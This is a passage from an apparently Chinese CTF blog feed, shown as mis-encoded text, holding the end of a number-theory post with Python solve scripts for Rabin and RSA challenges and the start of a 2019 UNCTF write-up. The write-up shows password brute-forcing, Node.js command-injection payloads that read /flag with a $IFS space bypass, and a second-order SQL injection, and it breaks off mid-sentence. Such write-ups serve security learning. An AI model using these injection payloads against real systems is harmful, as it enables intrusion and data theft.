q}$</p><h3 id="RabinåŠ å¯†"><a href="#RabinåŠ å¯†" class="headerlink" title="RabinåŠ å¯†"></a>RabinåŠ å¯†</h3><p>é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°$p$å’Œ$q$åšä¸ºç§é’¥</p><p>è®¡ç®—$n = p * q$åšä¸ºå…¬é’¥</p><p>è‹¥æ˜æ–‡ä¸ºmï¼Œåˆ™å¯†æ–‡ä¸º$c \equiv  m^2 \pmod{n}$</p><h3 id="Rabinè§£å¯†"><a href="#Rabinè§£å¯†" class="headerlink" title="Rabinè§£å¯†"></a>Rabinè§£å¯†</h3><p>æˆ‘ä»¬é¦–å…ˆè®¡ç®—å‡ºx1å’Œx2ï¼Œä½¿å¾—</p><p>$x_1^2 \equiv  c \pmod{p}$ï¼Œâ‘ </p><p>$x_2^2 \equiv  c \pmod q)$ï¼Œâ‘¡</p><h4 id="i-på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°"><a href="#i-på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°" class="headerlink" title="i)på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°"></a>i)på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°</h4><p>ç”±äº$p$æ˜¯ç´ æ•°ï¼Œæ˜¾ç„¶$c$ä¸$p$äº’ç´ ï¼Œå†ç”±å®šç†2</p><p>å¾—   </p><p>$x_1 \equiv  Â±c^\frac{p+1}{4}  \pmod{p}$</p><p>$x_2 \equiv  Â±c^\frac{q+1}{4}  \pmod{q}$</p><p>ï¼ˆä¸€æ­£ä¸€è´Ÿï¼Œè´Ÿçš„è®¡ç®—å¯ç®€åŒ–ä¸º æ¨¡-æ­£ï¼Œå¦‚ï¼š$-x_1 \equiv  p - x_1  \pmod{p}$ï¼‰</p><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥å¦‚æœ$p$å’Œ$q$ä¸æ˜¯æ¨¡$4$ä½™$3$çš„è¯ï¼Œcçš„æŒ‡æ•°å°±ä¸æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œä¹Ÿå°±ä¸èƒ½ç”¨è¿™ä¸ªæ–¹æ³•è®¡ç®—äº†</p><p>æ¥ç€æˆ‘ä»¬æ±‚å‡º$p$åœ¨æ¨¡$q$ä¸‹çš„é€†ï¼Œè®¾ä¸º$a$ï¼Œå³$a*p \equiv  1\pmod{q}$</p><p>ç„¶åæˆ‘ä»¬æ±‚å‡º$q$åœ¨æ¨¡$p$ä¸‹çš„é€†ï¼Œè®¾ä¸º$b$ï¼Œå³$b*q \equiv  1 \pmod{p}$</p><p>æ±‚å‡ºæ¥aï¼Œbç”¨äºä¸­å›½å‰©ä½™å®šç†</p><p>å¸¦å…¥ $x\equivÂ±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q Â± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})Â·p\pmod{p\cdot q}$</p><p>å¾—    $x \equivÂ±(c^\frac{p+1}{4}\pmod{p})Â·b\cdot q Â±(c^\frac{q+1}{4}\pmod{q})\cdot aÂ·p   \pmod{n}$</p><p>è®¾$c^\frac{p+1}{4}\pmod{p} $ä¸º$cp$ï¼Œ$c^\frac{q+1}{4} \pmod{q}$ä¸º$cq$</p><p>$x_1 = (b \cdot q \cdot c_p+a \cdot p \cdot c_q )  \mod n$<br>$-x_1 = n - x_1$<br>$x_2= (b \cdot q \cdot c_p- a \cdot p \cdot c_q)  \mod n$<br>$-x_2 = n - x_2$</p><p>å…¶ä¸­æœ‰ä¸€ä¸ªä¸ºæˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡mã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = p*q</span><br><span class="line">c_p = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">c_q = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x = (b*q*c_p+a*p*c_q)%n</span><br><span class="line">y = (b*q*c_p-a*p*c_q)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(x)</span><br><span class="line"><span class="keyword">print</span> n2s(n-x)</span><br><span class="line"><span class="keyword">print</span> n2s(y)</span><br><span class="line"><span class="keyword">print</span> n2s(n-y)</span><br></pre></td></tr></table></figure><h4 id="ii-på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°"><a href="#ii-på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°" class="headerlink" title="ii)på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°"></a>ii)på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°</h4><p>è¿™é‡Œæ¶‰åŠ <a href="https://en.wikipedia.org/wiki/Cipolla's_algorithm" target="_blank" rel="noopener">Cipollaâ€™s algorithm</a> ï¼Œ<a href="https://xz.aliyun.com/t/5113#toc-4" target="_blank" rel="noopener">å…ˆçŸ¥</a>å·²ç»æœ‰ä¸€ç¯‡è®²çš„ä¸é”™çš„æ–‡ç« äº† </p><h2 id="é¢˜ç›®å®ä¾‹"><a href="#é¢˜ç›®å®ä¾‹" class="headerlink" title="é¢˜ç›®å®ä¾‹"></a>é¢˜ç›®å®ä¾‹</h2><h3 id="UNCTF-ä¸€å¥è¯åŠ å¯†"><a href="#UNCTF-ä¸€å¥è¯åŠ å¯†" class="headerlink" title="UNCTF - ä¸€å¥è¯åŠ å¯†"></a>UNCTF - ä¸€å¥è¯åŠ å¯†</h3><p>é¢˜ç›®æ˜¯ç»™äº†ä¸€å¼ å›¾ï¼Œéšå†™äº†ä¸€ä¸ªæ¨¡n</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">n</span> = <span class="number">0</span>xc2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°nä¸å¤§ï¼Œç›´æ¥ç”¨yafuåˆ†è§£å¯å¾—</p><p><img src="https://i.loli.net/2020/04/30/542OKV3mC7N1PcM.png" alt="UNCTF - ä¸€å¥è¯åŠ å¯†"></p><p>ä½†æ˜¯æ‰¾ä¸åˆ°eï¼Œæœ€åè¯•äº†è¯•rabinï¼ŒæˆåŠŸç ´è§£</p><p>expç”¨ä¸Šé¢çš„é‚£ä¸ªå°±å¯</p><h3 id="roarctf-babyrsa"><a href="#roarctf-babyrsa" class="headerlink" title="roarctf - babyrsa"></a>roarctf - babyrsa</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import sympy</span><br><span class="line">import random</span><br><span class="line">def myGetPrime():</span><br><span class="line">    A= getPrime(513)</span><br><span class="line">    <span class="builtin-name">print</span>(A)</span><br><span class="line">    <span class="attribute">B</span>=A-random.randint(1e3,1e5)</span><br><span class="line">    <span class="builtin-name">print</span>(B)</span><br><span class="line">    return sympy.nextPrime((B!)%A)</span><br><span class="line"><span class="attribute">p</span>=myGetPrime()</span><br><span class="line"><span class="comment">#A1=</span></span><br><span class="line"><span class="comment">#B1=</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">q</span>=myGetPrime()</span><br><span class="line"><span class="comment">#A2=</span></span><br><span class="line"><span class="comment">#B2=</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=myGetPrime()</span><br><span class="line"><span class="attribute">n</span>=p*q*r</span><br><span class="line"><span class="comment">#n=</span></span><br><span class="line"><span class="attribute">c</span>=pow(flag,e,n)</span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"><span class="comment">#c=</span></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure><p>åŠ å¯†ä¸­çš„<strong>(B!)%A</strong>çš„ <strong>!</strong> åœ¨è¿™é‡Œæ˜¯é˜¶ä¹˜çš„æ„æ€ï¼Œæ‰€ä»¥æ˜¾ç„¶è¿™é‡Œè¦ç”¨åˆ°å¨å°”é€Šå®šç†ï¼Œä¸ç„¶è¿™ä¹ˆå¤§çš„ä¸€ä¸ªæ•°çš„é˜¶ä¹˜ï¼Œæ ¹æœ¬åƒä¸æ¶ˆå¥½å§</p><p>æ ¹æ®åŠ å¯†é€»è¾‘ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªä¸‰ç´ æ•°ç³»ç»Ÿï¼Œæ‰€ä»¥$Ï†(n) = (p-1)<em>(q-1)</em>(r-1)$ï¼Œç„¶å$r$è‚¯å®šæ˜¯è¦é€šè¿‡å…ˆæ±‚å‡º$pï¼Œq$æ¥å¾—å‡º</p><p>ç„¶åå…³äº$p$å’Œ$q$ï¼Œé¢˜ç›®ç»™çš„ä¿¡æ¯éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥æ±‚$p$å’Œæ±‚qçš„è§£æ³•è‚¯å®šæ˜¯ä¸€æ ·çš„ï¼Œ</p><p>æ‰€ä»¥é¢˜ç›®ç®€åŒ–ä¸ºï¼Œ<strong>æ ¹æ®A1,B1è§£p</strong></p><p>è€Œ$p \equiv (B!)  \pmod{A}$ ï¼ˆBæ˜¯ä¸€ä¸ªæ¯”Aå°çš„æ•°ï¼‰</p><p>è™½ç„¶Aï¼ŒBå‡å·²ç»™å‡ºä¸”äº’ç´ ï¼Œä½†æ˜¾ç„¶å¤§æ•°$B$çš„é˜¶ä¹˜æ˜¯ä¸å¯èƒ½ç›´æ¥æ±‚å¾—çš„ï¼Œ</p><p>æ‰€ä»¥è¦ç”¨å¨å°”é€Šå®šç†ç®€åŒ–è®¡ç®—</p><p>ç®€åŒ–è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>å·²çŸ¥ $B! \equiv  P\pmod{A})$</p><p>ç”±äºAæ˜¯ç´ æ•°ï¼Œæ‰€ä»¥æœ‰ï¼š        $(A-1)! \equiv  -1 \pmod{A}$</p><p>â€‹                   å³$(A-1)(A-2)â€¦â€¦(B+1)B! \equiv  -1 \pmod{A}$</p><p>â€‹         æ ¹æ®å·²çŸ¥$(A-1)(A-2)â€¦â€¦(B+1)P \equiv  -1 \pmod{A}$</p><p>â€‹                     å˜å½¢ä¸º$(A-2)â€¦â€¦(B+1)P \equiv  1 \pmod{A}$</p><p>æ‰€ä»¥$p$å³ä¸º$(A-2)(A-3)â€¦â€¦(B+1)$ åœ¨æ¨¡$A $ä¸‹çš„é€†</p><p>exp</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">import sympy</span><br><span class="line"></span><br><span class="line">A1=</span><br><span class="line">B1=</span><br><span class="line">A2=</span><br><span class="line">B2=</span><br><span class="line">n=</span><br><span class="line">e=0x1001</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">a = 1</span><br><span class="line">for i in range(A1-2,B1,-1):</span><br><span class="line">    a = a*i % A1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = 1</span><br><span class="line">for i in range(A2-2,B2,-1):</span><br><span class="line">    b = b*i % A2</span><br><span class="line">    </span><br><span class="line">p = sympy.nextprime(invert(a,A1))</span><br><span class="line">q = sympy.nextprime(invert(b,A2))</span><br><span class="line">r=n/p/q</span><br><span class="line">phi = (p-1)*(q-1)*(r-1)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print hex(m)[2:].decode('hex')</span><br></pre></td></tr></table></figure><h3 id="HECTF-easy-rsa"><a href="#HECTF-easy-rsa" class="headerlink" title="HECTF - easy_rsa"></a>HECTF - easy_rsa</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">from Crypto.Util import number</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#e = have a try</span></span><br><span class="line">p = number.getPrime(1024)</span><br><span class="line"></span><br><span class="line">q = number.getPrime(1024)</span><br><span class="line"></span><br><span class="line">nothing = 251560377963038761190200797029988859033 <span class="comment"># getPrime(128)</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">fn = (p-1)*(q-1)</span><br><span class="line">d =inverse(e, fn)</span><br><span class="line">something=(p-1)*d+nothing</span><br><span class="line">enc = pow(flag, e, p*q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n=</span></span><br><span class="line"><span class="comment">#something=</span></span><br><span class="line"><span class="comment">#enc=</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†ï¼Œnothingï¼ˆä¸‹é¢è®°ä¸ºrï¼‰ï¼Œsomethingï¼ˆä¸‹é¢è®°ä¸ºsï¼‰ï¼Œå…¶ä¸­$ (p-1)*d= s - r$</p><p>ç›®çš„å¾ˆæ˜ç¡®ï¼Œå°±æ˜¯åˆ†è§£å¤§æ•°n</p><p>è¿™ä¸€é¢˜çš„æ€è·¯å°±æ˜¯åˆ©ç”¨$GCD$æ¥çº¦å‡º$n$çš„å› å­</p><p>æ‰€ä»¥é¦–å…ˆè¦è·å¾—ä¸€ä¸ª$p$çš„å€æ•°</p><p>æ ¹æ®è´¹é©¬å°å®šç†</p><p>$2^{p-1} \equiv  1 \pmod{p}$æ˜¾ç„¶æˆç«‹    (ä¸»è¦æ˜¯ä¸ºäº†åˆ©ç”¨é¢˜ç›®ä¸­ç»™å‡ºçš„$ (p-1)*d$ï¼‰</p><p>æ‰€ä»¥è®¾$A = 2^{p-1} - 1 = kp$</p><p>ç„¶ååˆ©ç”¨æ¬§æ‹‰å®šç†ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨ä¸Šæ–‡ä¸­æåˆ°çš„RSAçš„è§£å¯†è¯æ˜ä¸­çš„ç»“è®º</p><p><img src="https://i.loli.net/2020/04/30/1mkjEzZBHAdD2bW.png" alt="æ¬§æ‹‰å®šç†"></p><p>$(2^{p-1})^{ed}  \equiv  (2^{p-1})   \pmod{n}$</p><p>ç”±é¢˜ï¼Œ$(p-1)d = s - r$</p><p>æ‰€ä»¥$A  \equiv  2^{p-1} - 1  \equiv   (2^{p-1})^{ed} - 1 \equiv   2^{es-er} - 1    \pmod{n}$</p><p>æ‰€ä»¥  $gcd( 2^{es-er} - 1 , n) $</p><p>å³      $gcd(kp , pq) $</p><p>å³å¯å¾—åˆ°     $p$</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">enc=</span><br><span class="line">n=</span><br><span class="line">something=</span><br><span class="line">nothing=</span><br><span class="line">e=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        e=sympy.nextprime(e)</span><br><span class="line">        a=pow(<span class="number">2</span>,e*something-e*nothing,n)<span class="number">-1</span></span><br><span class="line">        p=libnum.gcd(a,n)</span><br><span class="line">        q=n/p</span><br><span class="line">        fn=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">        d=invert(e,fn)</span><br><span class="line">        flag=libnum.n2s(pow(enc,d,n))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hebtu"</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="æ„é€ GCD"><a href="#æ„é€ GCD" class="headerlink" title="æ„é€ GCD"></a>æ„é€ GCD</h3><p>å¯ä»¥çœ‹å‡ºï¼Œæ„é€ gcdæ¥æ±‚å¤§æ•°nçš„å› å­ä»¥æ­¤æ¥åˆ†è§£næ˜¯ä¸€ç§å¾ˆå¥½åˆå¾ˆå·§å¦™çš„æ–¹å¼,æ¥çœ‹è¿™ä¸€é¢˜</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">a=int(pow((q+p),2019,n))</span><br><span class="line">b=int(pow(p+2019,q,n))</span><br><span class="line">n=</span><br><span class="line">a=</span><br><span class="line">b=</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œæˆ‘ä»¬è¦é€šè¿‡å·²ç»™å‡ºçš„aå’Œbï¼Œæ¥åˆ†è§£n</p><p>é€šè¿‡aï¼Œbå’Œpï¼Œqçš„å…³ç³»ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•ç”¨a,bå‡‘å‡ºä¸€ä¸ªGCDæ¥æ±‚å‡ºnçš„ä¸€ä¸ªå› å­</p><p>è§£é¢˜è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>ç”±$ a \equiv  (p+q)^{2019} \pmod{n}$</p><p>å¯å¾—    $a \equiv  (p+q)^{2019} \equiv  p^{2019}  \pmod{q}$        ã€äºŒé¡¹å¼å±•å¼€å®šç†ã€‘</p><p>ç”±$ b \equiv  (p+2019)^q \pmod{n}$</p><p>å¯å¾— $b \equiv  (p+2019)^q \equiv  p+2019  \pmod{q}$            ã€è´¹é©¬å°å®šç†ï¼š$(p+2019)^q-1 \equiv  1 \pmod{q}$ã€‘</p><p>æ‰€ä»¥$ a \equiv  (b - 2019)^{2019} \pmod{q}$</p><p>â€‹    å³$ a =  (b - 2019)^2019 + kq$</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‡‘å‡ºä¸€ä¸ª$GCD$</p><p>$GCDï¼ˆ (b - 2019)^{2019}-aï¼Œnï¼‰=  GCDï¼ˆ Kqï¼Œnï¼‰= q$</p><p>è§£é¢˜å®Œæ¯•</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸€æ¬¡å­¦ä¹ äº†æ•°è®ºå››å¤§å®šç†çš„è¯æ˜ã€åº”ç”¨ï¼Œä»¥åŠrabinå¯†ç çš„è§£æ³•ã€‚å‘ç°å…¶å®å¾ˆå¤šè§£æ³•ã€æ”»å‡»æ–¹æ³•éƒ½æ˜¯å¤šç§å®šç†çš„ç»“åˆè¿ç”¨ï¼Œæœ‰æ—¶å€™è¿˜è¦å¼•å‡ºå„ç§æ¨è®ºï¼Œå¾ˆçµæ´»</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>æ¬§æ‹‰å®šç†è¯æ˜ï¼š <a href="https://www.cnblogs.com/wangxiaodai/p/9758242.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangxiaodai/p/9758242.html</a> </p><p>ä¸­å›½å‰©ä½™å®šç†è¯æ˜ï¼š <a href="https://blog.csdn.net/Rain722/article/details/53230707" target="_blank" rel="noopener">https://blog.csdn.net/Rain722/article/details/53230707</a> </p><p>å¨å°”é€Šå®šç†è¯æ˜ï¼š <a href="https://www.cnblogs.com/Judge/p/10755703.html" target="_blank" rel="noopener">https://www.cnblogs.com/Judge/p/10755703.html</a> </p><p>Rabinç®—æ³•ï¼š <a href="https://veritas501.space/2017/03/01/å¯†ç å­¦ç¬”è®°/" target="_blank" rel="noopener">https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</a> </p><p> <a href="https://xz.aliyun.com/t/5113" target="_blank" rel="noopener">https://xz.aliyun.com/t/5113</a> </p><p> <a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rabin_cryptosystem</a> </p><p> <a href="https://blog.csdn.net/qq_24451605/article/details/45093911" target="_blank" rel="noopener">https://blog.csdn.net/qq_24451605/article/details/45093911</a> </p><p>æœ€åæ„Ÿè°¢Lurå¤§ä½¬çš„ä¸€æ‰‹æŒ‡ç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Abstract algebra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 UNCTF</title>
      <link href="/2019/11/11/2019UNCTF/"/>
      <url>/2019/11/11/2019UNCTF/</url>
      
        <content type="html"><![CDATA[<p>åŸæ–‡å‘è¡¨äº<a href="https://www.anquanke.com/post/id/190613" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="å¸®èµµæ€»å¾å©š"><a href="#å¸®èµµæ€»å¾å©š" class="headerlink" title="å¸®èµµæ€»å¾å©š"></a>å¸®èµµæ€»å¾å©š</h3><p>å‘ƒï¼Œå¸®ä¸äº†èµµæ€»å¾å©š~ã€‚</p><p>f12ï¼Œæœ‰ä¸ªhintï¼š<code>&lt;!-- I like rockyou! --&gt;</code></p><p>ä¸Šrockyouå­—å…¸ï¼ˆä¸å¯èƒ½çš„ï¼Œbpä¼šç‚¸ï¼Œä¸Štop3000ï¼‰ï¼Œç›´æ¥çˆ†ï¼Œå¾—åˆ°flag</p><p><a href="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" alt="img"></a></p><p>å¾—åˆ°flagï¼šflag{57fc636a42f46c7658110a631256f5cb}</p><h3 id="ç®€å•çš„å¤‡å¿˜å½•"><a href="#ç®€å•çš„å¤‡å¿˜å½•" class="headerlink" title="ç®€å•çš„å¤‡å¿˜å½•"></a>ç®€å•çš„å¤‡å¿˜å½•</h3><p>emmmï¼Œæ²¡å­¦è¿‡çš„è¯­è¨€ï¼Œè¿›å»å„ç§fuzzï¼Œ</p><p>å‘ç°æ‰“ä¸€ä¸ªå­—æ¯ä»–å°±ä¼šç»™äº›é€‰æ‹©</p><p><a href="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" alt="img"></a></p><p>æœ€åéšç¼˜æ•´å‡ºflag</p><p><a href="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" alt="img"></a></p><p>flag{3ad4aaedf408c147d5f747f7ce76d2b4}</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>è¿›å…¥æ˜¯ä¸ªèŠå¤©æ¡†ï¼Œ/name æ”¹åå­—</p><p>/flag ä¼šæ‰“å°flag1flag1flag1â€¦.</p><p>/more æ˜¾ç¤º/flag â€“ å°ä¼™å­â€¦</p><p>/calc å¯ä»¥è®¡ç®—ï¼Œï¼ˆçŒœæµ‹è¿™é‡Œå¯èƒ½æœ‰å‘½ä»¤æ‰§è¡Œï¼‰</p><p><a href="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" alt="img"></a></p><p>æ‰¾åˆ°ç¯‡æ–‡ç« <a href="https://m.jb51.net/article/91411.htm`" target="_blank" rel="noopener">https://m.jb51.net/article/91411.htm`</a></p><p>äºæ˜¯è¯•äº†è¯•é‡Œé¢çš„payloadï¼š/calc require(â€˜child_processâ€™).exec(â€˜lsâ€™).toString()</p><p>è¿”å›äº†ï¼šè¡€å°æ¿: [object Object]</p><p>ç„¶åè¯•äº†è¯•execSyncï¼š/calc require(â€˜child_processâ€™).execSync(â€˜lsâ€™).toString()</p><p>è¿”å›äº†ï¼šbin games include lib local sbin share srcå‘½ä»¤æ‰§è¡ŒæˆåŠŸ</p><p>äºæ˜¯è¯»å–flagï¼š/calc require(â€˜child_processâ€™).execSync(â€˜cat /flagâ€™).toString()</p><p>è¿”å›ï¼šè¡€å°æ¿: undefined</p><p>åº”è¯¥æ˜¯ç©ºæ ¼çš„é—®é¢˜ï¼Œé‚£å°±ç”¨$IFSæ›¿ä»£ï¼š/calc require(â€˜child_processâ€™).execSync(â€˜cat$IFS/flagâ€™).toString()</p><p>æˆåŠŸæ‹¿åˆ°flag</p><p><a href="https://p3.ssl.qhimg.com/t015673743622d5d679.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t015673743622d5d679.png" alt="img"></a></p><p>flag{0e4d1980ef6f8a81428f83e8e1c6e22b}</p><h3 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h3><p>åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œæ³¨å†Œadminâ€™#åæ”¹å¯†ç ï¼Œç„¶åç”¨adminç™»å½•ï¼Œå‘ç°å¹¶æ²¡æœ‰flagï¼ˆå¯æ¶å‘¢</p><p>ä½†æ˜¯ï¼Œæ—¢ç„¶è¿™ä¸ªäºŒæ¬¡æ³¨å…¥ç‚¹è¿˜åœ¨ï¼Œé‚£ä»ç„¶æ˜¯å¯ä»¥è¢«æ‹¿æ¥åˆ©ç”¨çš„</p><p>åœ¨å•å¼•å·å’Œ#ä¸­é—´å°±å¯ä»¥æ³¨å…¥è¯­å¥</p><p>å„ç§fuzzåï¼Œå‘ç°å¾ˆå¤šå‡½æ•°éƒ½è¢«wafäº†ï¼ˆsmarterâ€¦harderâ€¦å¤§æ¦‚æ˜¯æœ‰å›æ˜¾çš„ç›²æ³¨äº†ï¼‰</p><p>æœ€åï¼Œå‘ç°äº†è¿™ç¯‡æ–‡ç« <a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://p1.ssl.qhimg.com/t017ee419351442a907.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t017ee419351442a907.png" alt="img"></a></p><p>äºæ˜¯è¯•ç€æ„é€ 